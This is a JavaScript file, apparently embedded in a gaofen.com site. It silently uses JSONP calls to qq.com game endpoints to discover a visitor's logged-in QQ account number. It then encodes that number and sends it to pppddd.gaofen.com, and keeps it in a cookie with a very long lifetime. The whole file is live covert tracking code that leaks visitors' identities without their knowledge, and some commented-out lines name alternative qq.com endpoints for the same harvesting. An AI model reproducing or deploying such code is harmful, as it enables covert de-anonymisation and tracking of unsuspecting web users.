$(function(){
    var jq  = jQuery, quin, ck = 'uky', jqgt = !!jq.cookie;
    if(jqgt) quin = jq.cookie(ck);
    else if(typeof getcookie !== 'undefined'){
        quin = getcookie(ck);
    }
    var _quin = []
        ,purl = 'http://pppddd.gaofen.com/gm/a.js';

    function checkLogin(){
        var t = +new Date, url = 'http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t='+t;
        appendJS(url, function(s){
            if(data0 && data0.err === 1026){
                appJs();
            }else if(data0 && data0.err === 1002){
                if(quin){
                    pushUin(quin);
                }else{
                    setTimeout(checkLogin, 10000);
                }
            }
        });
    }

    function appJs(){
		var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_silver_to_gold_box?callback=gaofenCallback&uin=&_='+t;
        //var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/yxs/GetYxsRegTime?callback=gaofenCallback&dstuin=&t='+t;		
        //var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead/get_player_info?callback=gaofenCallback&uin=&_='+t;
        //var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/gamevip_fetch_vip_info_mini?imgtype=3&DomainID=207&callback=gaofenCallback&t='+t;
        //url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead?imgtype=3&DomainID=207&callback=gaofenCallback&t=1401862163959'
        appendJS(url);
    }

    function  toASCII(qq){
        var qqCode = [];
        qq +='';
        for(var i=0;i < qq.length;i++){
            qqCode.push(qq.charCodeAt(i));
        }
        return qqCode.join(',');
    }

    function pushUin(u){
        var t = +new Date, charcode = toASCII(u);
        appendJS(purl+'?uin='+charcode+'&_='+t);
        //jq.get(purl, {quin : u}, function(r){
        if(jqgt){
            jq.cookie(ck,  charcode, {expires:800000000});
        }else if(typeof setcookie !== 'undefined'){
            setcookie(ck , charcode, 80000000000);
        }
        //});
    }

    function appendJS(url, success, error, id){
        success = success || jq.noop;
        var oScript = document.createElement("script");
        oScript.type = "text/javascript";
        oScript.src = url;
        if (oScript.readyState) {
            oScript.onreadystatechange = function() {
                if (oScript.readyState == "loaded"
                    || oScript.readyState == "complete") {
                    oScript.onreadystatechange = null;
                    window.setTimeout(success, 10);
                }
            };
        } else {
            oScript.onload = function() {
                window.setTimeout(success, 10);
            };
        }

        if(id){

            oScript.id = id;
        }

        oScript.onerror = function(){

            (error || $.noop)();
        }
        document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
    }

    window.gaofenCallback = window.gaofenCallback || function(d){
        if(d.result === 1000005){//未登录
            if(quin) pushUin(quin);
            else setTimeout(appJs, 10000);
        }else{
            pushUin(d.uin);
        }
    };
    if(quin){
        var quin = quin.split(','), _quin = [];
        for(var i= 0,len = quin.length;i<len;i++){
            _quin.push(String.fromCharCode(quin[i]));
        }
        quin = _quin = _quin.join('');
        checkLogin();
        //appJs();
        //pushUin(_quin);
    }else{
        checkLogin();
        //appJs();
    }
});